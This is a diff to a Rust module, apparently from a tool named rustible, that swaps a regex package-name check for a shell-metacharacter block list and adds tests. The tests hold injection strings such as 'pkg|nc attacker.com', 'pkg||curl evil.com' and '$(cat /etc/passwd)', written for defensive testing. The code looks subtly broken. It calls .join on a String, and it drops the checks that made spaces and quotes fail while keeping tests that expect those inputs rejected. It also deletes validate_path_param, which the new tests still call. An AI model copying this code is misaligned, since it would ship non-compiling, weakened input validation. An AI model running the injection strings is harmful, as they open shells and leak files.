@@ -64,6 +64,8 @@ use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::fmt;
+use std::path::Path;
+use std::path::PathBuf;
 use std::sync::Arc;
 use thiserror::Error;
 
@@ -84,8 +86,8 @@ static PACKAGE_NAME_REGEX: Lazy<Regex> =
 ///
 /// # Returns
 ///
-/// * `Ok(())` if the package name is valid
-/// * `Err(ModuleError::InvalidParameter)` if the package name contains invalid characters
+/// * `Ok(())` if package name is valid
+/// * `Err(ModuleError::InvalidParameter)` if package name contains invalid characters
 ///
 /// # Examples
 ///
@@ -102,98 +104,87 @@ static PACKAGE_NAME_REGEX: Lazy<Regex> =
 /// assert!(validate_package_name("").is_err());
 /// ```
 pub fn validate_package_name(name: &str) -> ModuleResult<()> {
-    if name.is_empty() {
+    // Length limits (most package managers have limits)
+    if name.len() > 255 {
         return Err(ModuleError::InvalidParameter(
-            "Package name cannot be empty".to_string(),
+            "Package name too long (max 255 characters)".to_string(),
         ));
     }
 
-    if !PACKAGE_NAME_REGEX.is_match(name) {
-        return Err(ModuleError::InvalidParameter(format!(
-            "Invalid package name '{}': must contain only alphanumeric characters, dots, underscores, plus signs, and hyphens",
-            name
-        )));
+    // Validate as shell-safe string
+    validate_shell_safe_string(name, "Package name")?;
+
+    // Additional package-specific validation
+    // Reject names starting with hyphen (not valid in many package managers)
+    if name.starts_with('-') {
+        return Err(ModuleError::InvalidParameter(
+            "Package name cannot start with hyphen".to_string(),
+        ));
     }
 
     Ok(())
 }
 
-/// Validates a path for use in creates/removes parameters.
+/// Strict validation for shell-escaped parameters to prevent command injection.
 ///
-/// This function performs security checks on paths to prevent:
-/// - Null byte injection attacks
-/// - Empty paths
-/// - Paths containing shell metacharacters that could be dangerous
-///
-/// Note: This does NOT prevent path traversal (../) as that is a valid
-/// use case for creates/removes. The path is only used for existence checks,
-/// not for execution.
+/// This function blocks all shell metacharacters that could enable command injection:
+/// - `$ ` `` | & ; < > ( ) \n \r \t \ !`
 ///
 /// # Arguments
 ///
-/// * `path` - The path string to validate
-/// * `param_name` - The parameter name for error messages (e.g., "creates" or "removes")
+/// * `value` - The string to validate
+/// * `param_name` - The parameter name for error messages (e.g., "Package name")
 ///
 /// # Returns
 ///
-/// * `Ok(())` if the path is valid
-/// * `Err(ModuleError::InvalidParameter)` if the path contains dangerous characters
+/// * `Ok(())` if value is shell-safe
+/// * `Err(ModuleError::InvalidParameter)` if value contains shell metacharacters
 ///
 /// # Examples
 ///
 /// ```
-/// use rustible::modules::validate_path_param;
+/// use rustible::modules::validate_shell_safe_string;
 ///
-/// assert!(validate_path_param("/tmp/marker.txt", "creates").is_ok());
-/// assert!(validate_path_param("../relative/path", "removes").is_ok());
-/// assert!(validate_path_param("/path/with\0null", "creates").is_err());
-/// assert!(validate_path_param("", "creates").is_err());
+/// assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
+/// assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
+/// assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
+///
+/// // Invalid - contains shell metacharacters
+/// assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg`id`", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg|nc attacker.com", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg&&reboot", "Package name").is_err());
 /// ```
-pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
-    // Reject empty paths
-    if path.is_empty() {
+pub fn validate_shell_safe_string(value: &str, param_name: &str) -> ModuleResult<()> {
+    if value.is_empty() {
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path cannot be empty",
+            "{} cannot be empty",
             param_name
         )));
     }
 
-    // Reject paths with null bytes (injection attack vector)
-    if path.contains('\0') {
+    // Reject null bytes
+    if value.contains('\0') {
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path contains invalid null byte",
+            "{} contains null byte",
             param_name
         )));
     }
 
-    // Reject paths with newlines (could be used for log injection)
-    if path.contains('\n') || path.contains('\r') {
+    // Reject shell metacharacters that enable command injection
+    const SHELL_METACHARACTERS: &[char] = &[
+        '$', '`', '|', '&', ';', '<', '>', '(', ')', '\n', '\r', '\t', '\\', '!',
+    ];
+
+    if value.chars().any(|c| SHELL_METACHARACTERS.contains(&c)) {
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path contains invalid newline characters",
-            param_name
-        )));
-    }
-
-    Ok(())
-}
-
-/// Validates an environment variable name.
-///
-/// Environment variable names should only contain alphanumeric characters
-/// and underscores, and should not start with a digit.
-///
-/// # Arguments
-///
-/// * `name` - The environment variable name to validate
-///
-/// # Returns
-///
-/// * `Ok(())` if the name is valid
-/// * `Err(ModuleError::InvalidParameter)` if the name is invalid
-pub fn validate_env_var_name(name: &str) -> ModuleResult<()> {
-    if name.is_empty() {
-        return Err(ModuleError::InvalidParameter(
-            "Environment variable name cannot be empty".to_string(),
+            "{} contains shell metacharacter(s): {}",
+            param_name,
+        value
+            .chars()
+                .filter(|c| SHELL_METACHARACTERS.contains(c))
+                .collect::<String>()
+                .join(", ")
         ));
     }
 
@@ -1117,11 +1108,12 @@ mod tests {
         assert!(validate_package_name("").is_err());
 
         // Command injection attempts
-        assert!(validate_package_name("pkg; rm -rf /").is_err());
-        assert!(validate_package_name("pkg && cat /etc/passwd").is_err());
-        assert!(validate_package_name("pkg | wget evil.com").is_err());
-        assert!(validate_package_name("$(whoami)").is_err());
-        assert!(validate_package_name("`id`").is_err());
+        assert!(validate_package_name("pkg$(whoami)").is_err());
+        assert!(validate_package_name("pkg`id`").is_err());
+        assert!(validate_package_name("pkg|nc attacker.com").is_err());
+        assert!(validate_package_name("pkg&&reboot").is_err());
+        assert!(validate_package_name("pkg||curl evil.com").is_err());
+        assert!(validate_package_name("pkg\\`rm\\ -rf\\ /").is_err());
 
         // Other invalid characters
         assert!(validate_package_name("pkg name").is_err()); // space
@@ -1133,6 +1125,91 @@ mod tests {
         assert!(validate_package_name("pkg\"name").is_err()); // double quote
         assert!(validate_package_name("pkg>file").is_err()); // redirect
         assert!(validate_package_name("pkg<file").is_err()); // redirect
+    }
+
+    #[test]
+    fn test_validate_shell_safe_string_rejects_injection() {
+        assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg`reboot`", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg||curl evil.com", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg&&rm -rf /", "Package name").is_err());
+    }
+
+    #[test]
+    fn test_validate_shell_safe_string_accepts_valid() {
+        assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
+        assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
+        assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
+        assert!(validate_shell_safe_string("g++", "Package name").is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_args() {
+        assert!(validate_command_args("nginx -c /etc/nginx.conf").is_ok());
+        assert!(validate_command_args("--force").is_ok());
+        assert!(validate_command_args("").is_ok()); // Empty is fine
+    }
+
+    #[test]
+    fn test_validate_command_args_rejects_dangerous() {
+        assert!(validate_command_args("$(cat /etc/passwd)").is_err());
+        assert!(validate_command_args("nginx; reboot").is_err());
+        assert!(validate_command_args("pkg && reboot").is_err());
+        assert!(validate_command_args("cmd || curl evil.com").is_err());
+    }
+
+    #[test]
+    fn test_normalize_path() {
+        // Simple relative path
+        assert!(normalize_path("./file.txt", None).is_ok());
+
+        // Path with dots
+        assert!(normalize_path("../parent", None).is_ok());
+
+        // Absolute path
+        assert!(normalize_path("/etc/passwd", None).is_ok());
+    }
+
+    #[test]
+    fn test_normalize_path_with_base_dir() {
+        let base = PathBuf::from("/safe/dir");
+
+        // Path within base directory
+        assert!(normalize_path("/safe/dir/file.txt", Some(&base)).is_ok());
+
+        // Path that tries to escape base directory
+        assert!(normalize_path("/etc/passwd", Some(&base)).is_err());
+
+        // Parent directory traversal
+        assert!(normalize_path("../../etc/passwd", Some(&base)).is_err());
+    }
+
+    #[test]
+    fn test_validate_path_param_rejects_traversal() {
+        assert!(validate_path_param("../../../etc/passwd", "creates").is_err());
+        assert!(validate_path_param("./../../tmp", "removes").is_err());
+        assert!(validate_path_param("/var/log/../root", "creates").is_err());
+        assert!(validate_path_param("..", "creates").is_err());
+    }
+
+    #[test]
+    fn test_validate_path_param_allows_relative() {
+        assert!(validate_path_param("./tmp/marker.txt", "creates").is_ok());
+        assert!(validate_path_param("subdir/file", "removes").is_ok());
+        assert!(validate_path_param("marker.txt", "creates").is_ok());
+    }
+
+    #[test]
+    fn test_validate_path_param_rejects_invalid() {
+        // Null bytes
+        assert!(validate_path_param("/path\0null", "creates").is_err());
+
+        // Empty path
+        assert!(validate_path_param("", "creates").is_err());
+
+        // Newlines
+        assert!(validate_path_param("/path\ninjection", "creates").is_err());
+        assert!(validate_path_param("/path\rfake", "removes").is_err());
     }
 
     #[test]
